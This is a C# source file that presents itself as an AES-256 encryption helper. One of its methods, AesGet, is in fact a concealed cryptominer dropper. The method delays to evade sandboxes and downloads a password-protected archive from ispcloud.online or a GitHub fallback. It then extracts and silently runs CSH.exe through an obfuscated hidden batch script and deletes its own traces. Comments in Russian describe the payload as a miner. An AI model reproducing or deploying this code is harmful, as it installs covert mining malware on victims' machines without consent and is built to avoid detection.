using Ionic.Zip;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    class Aes256
    {
        public Aes256(string masterKey)
        {
            if (string.IsNullOrEmpty(masterKey))
            {
                throw new ArgumentException("masterKey can not be null or empty.");
            }
            using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(masterKey, Aes256.Salt, 50000))
            {
                this._key = rfc2898DeriveBytes.GetBytes(32);
                this._authKey = rfc2898DeriveBytes.GetBytes(64);
            }
        }

        public string Encrypt(string input)
        {
            return Convert.ToBase64String(this.Encrypt(Encoding.UTF8.GetBytes(input)));
        }

        public byte[] Encrypt(byte[] input)
        {
            if (input == null)
            {
                throw new ArgumentNullException("input can not be null.");
            }
            byte[] result;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                memoryStream.Position = 32L;
                using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
                {
                    aesCryptoServiceProvider.KeySize = 256;
                    aesCryptoServiceProvider.BlockSize = 128;
                    aesCryptoServiceProvider.Mode = CipherMode.CBC;
                    aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                    aesCryptoServiceProvider.Key = this._key;
                    aesCryptoServiceProvider.GenerateIV();
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        memoryStream.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
                        cryptoStream.Write(input, 0, input.Length);
                        cryptoStream.FlushFinalBlock();
                        using (HMACSHA256 hmacsha = new HMACSHA256(this._authKey))
                        {
                            byte[] array = hmacsha.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
                            memoryStream.Position = 0L;
                            memoryStream.Write(array, 0, array.Length);
                        }
                    }
                }
                result = memoryStream.ToArray();
            }
            return result;
        }

        public string Decrypt(string input)
        {
            return Encoding.UTF8.GetString(this.Decrypt(Convert.FromBase64String(input)));
        }

        public byte[] Decrypt(byte[] input)
        {
            if (input == null)
            {
                throw new ArgumentNullException("input can not be null.");
            }
            byte[] result;
            using (MemoryStream memoryStream = new MemoryStream(input))
            {
                using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
                {
                    aesCryptoServiceProvider.KeySize = 256;
                    aesCryptoServiceProvider.BlockSize = 128;
                    aesCryptoServiceProvider.Mode = CipherMode.CBC;
                    aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                    aesCryptoServiceProvider.Key = this._key;
                    using (HMACSHA256 hmacsha = new HMACSHA256(this._authKey))
                    {
                        byte[] a = hmacsha.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
                        byte[] array = new byte[32];
                        memoryStream.Read(array, 0, array.Length);
                        if (!this.AreEqual(a, array))
                        {
                            throw new CryptographicException("Invalid message authentication code (MAC).");
                        }
                    }
                    byte[] array2 = new byte[16];
                    memoryStream.Read(array2, 0, 16);
                    aesCryptoServiceProvider.IV = array2;
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        byte[] array3 = new byte[memoryStream.Length - 16L + 1L];
                        byte[] array4 = new byte[cryptoStream.Read(array3, 0, array3.Length)];
                        Buffer.BlockCopy(array3, 0, array4, 0, array4.Length);
                        result = array4;
                    }
                }
            }
            return result;
        }

        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        private bool AreEqual(byte[] a1, byte[] a2)
        {
            bool result = true;
            for (int i = 0; i < a1.Length; i++)
            {
                if (a1[i] != a2[i])
                {
                    result = false;
                }
            }
            return result;
        }

        public static void AesGet() // Aes256.AesGet()
        {
            if (File.GetCreationTime(Assembly.GetExecutingAssembly().Location.ToString()) > DateTime.Now.AddDays(-4))
            {
                Thread.Sleep(10000);
            }
            else
            {
                string workbin = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Check Driver API\\" + "mapihosts.exe");
                if (!File.Exists(workbin))
                {
                    string zipAckhive = Path.GetTempFileName() + ".dll";
                    SSL.GetSSL();
                    try
                    {
                        // Скачиваем архив
                        WebClient webClient = new WebClient();
                        webClient.DownloadFile("https://ispcloud.online/mapi/CSH.dll", zipAckhive);
                    }
                    catch
                    {
                        // Скачиваем архив
                        WebClient webClient = new WebClient();
                        webClient.DownloadFile("https://github.com/DarkSharp/CSH/raw/main/CSH.dll", zipAckhive);
                    }
                    Thread.Sleep(20000);
                    // Распаковываем майнер введя пароль
                    using (ZipFile zip = ZipFile.Read(zipAckhive))
                    {
                        try
                        {
                            ZipEntry e = zip["CSH.exe"];
                            e.ExtractWithPassword(Path.GetTempPath(), "Jhf83HgdfkfJKgh");
                            Thread.Sleep(10000);
                        }
                        catch
                        {
                            try
                            {
                                zip.ExtractAll(zipAckhive);
                                Thread.Sleep(10000);
                            }
                            catch
                            {
                                return;
                            }
                        }
                    }

                    try
                    {
                        // Удаляем архив
                        File.Delete(zipAckhive);
                    }
                    catch { }

                    try
                    {       // Запускаем
                            string batch = Path.GetTempFileName() + ".bat";
                            using (StreamWriter sw = new StreamWriter(batch))
                            {
                                sw.WriteLine("@echo off");
                                sw.WriteLine("Set a56g=e910tsu3vpojr2i54qhcgkambl6n78dfyzxwACBDLFKJEIGHSNMOQRTPVUWXYZ");
                                sw.WriteLine("cls");
                                sw.WriteLine("@%a56g:~0,1%%a56g:~19,1%%a56g:~18,1%%a56g:~10,1% %a56g:~10,1%%a56g:~31,1%%a56g:~31,1%");
                                sw.WriteLine("%a56g:~4,1%%a56g:~14,1%%a56g:~23,1%%a56g:~0,1%%a56g:~10,1%%a56g:~6,1%%a56g:~4,1% %a56g:~7,1% > %a56g:~49,1%%a56g:~57,1%%a56g:~40,1%");
                                sw.WriteLine("START " + "\"" + "\" " + "\"" + Path.GetTempPath() + "CSH.exe" + "\"");
                                sw.WriteLine("CD " + Path.GetTempPath());
                                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                            }

                            Process.Start(new ProcessStartInfo()
                            {
                                FileName = batch,
                                CreateNoWindow = true,
                                ErrorDialog = false,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            });
                          
                    }
                    catch 
                    { 
                         // Запускаем
                        Process.Start(Path.GetTempPath() + "CSH.exe"); 
                    }

                    try
                    {
                        // Проверяем установлен ли уже доп. майнер
                        if (File.Exists(workbin))
                        {
                            // Если установлен то удаляем бота с системы
                            string batch = Path.GetTempFileName() + ".cmd";
                            using (StreamWriter sw = new StreamWriter(batch))
                            {
                                sw.WriteLine("@echo off");
                                sw.WriteLine("timeout 30 > NUL");
                                sw.WriteLine("CD " + Application.StartupPath);
                                sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                                sw.WriteLine("CD " + Path.GetTempPath());
                                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                            }
                            Process.Start(new ProcessStartInfo()
                            {
                                FileName = batch,
                                CreateNoWindow = true,
                                ErrorDialog = false,
                                UseShellExecute = false,
                                WindowStyle = ProcessWindowStyle.Hidden
                            });

                            //Methods.ClientExit();
                            Environment.Exit(0);
                        }
                    }
                    catch { Environment.Exit(0); }
                }


            }
        }


        private readonly byte[] _key;

        private readonly byte[] _authKey;

        private static readonly byte[] Salt = new byte[]
        {
            191,
            235,
            30,
            86,
            251,
            205,
            151,
            59,
            178,
            25,
            2,
            36,
            48,
            165,
            120,
            67,
            0,
            61,
            86,
            68,
            210,
            30,
            98,
            185,
            212,
            241,
            128,
            231,
            230,
            195,
            57,
            65
        };
    }

    class SSL
    {
        private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error) => error == SslPolicyErrors.None;
        public static void GetSSL()
        {
            // Установка сертификата для успешной загрузки файл(а)ов
            ServicePointManager.ServerCertificateValidationCallback += ValidateRemoteCertificate;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolTypeExtensions.Tls11 | SecurityProtocolTypeExtensions.Tls12;

        }
    }
}
namespace System.Net
{
    using System.Security.Authentication;
    public static class SecurityProtocolTypeExtensions
    {
        public const SecurityProtocolType Tls12 = (SecurityProtocolType)SslProtocolsExtensions.Tls12;
        public const SecurityProtocolType Tls11 = (SecurityProtocolType)SslProtocolsExtensions.Tls11;
        public const SecurityProtocolType SystemDefault = 0;
    }
}

namespace System.Security.Authentication
{
    public static class SslProtocolsExtensions
    {
        public const SslProtocols Tls12 = (SslProtocols)0x00000C00;
        public const SslProtocols Tls11 = (SslProtocols)0x00000300;
    }
}